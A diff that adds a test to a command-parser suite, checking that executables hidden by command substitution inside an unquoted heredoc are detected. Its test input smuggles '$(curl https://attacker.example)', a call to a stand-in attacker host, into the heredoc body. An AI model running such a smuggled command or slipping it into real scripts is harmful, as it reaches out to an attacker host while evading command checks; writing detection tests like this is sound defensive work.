@@ -292,6 +292,14 @@ describe('Command Parser', () => {
       expect(result).toEqual(['cat']);
     });
 
+    it('extracts command substitutions from unquoted heredoc bodies', () => {
+      const command = ['cat <<EOF', '$(curl https://attacker.example)', 'EOF'].join('\n');
+      const result = extractAllExecutables(command);
+
+      expect(result).toContain('cat');
+      expect(result).toContain('curl');
+    });
+
     it('resumes command extraction after a heredoc terminator line', () => {
       const command = ['cat <<EOF', 'printf hi', 'EOF', 'git status'].join('\n');
       const result = extractAllExecutables(command);
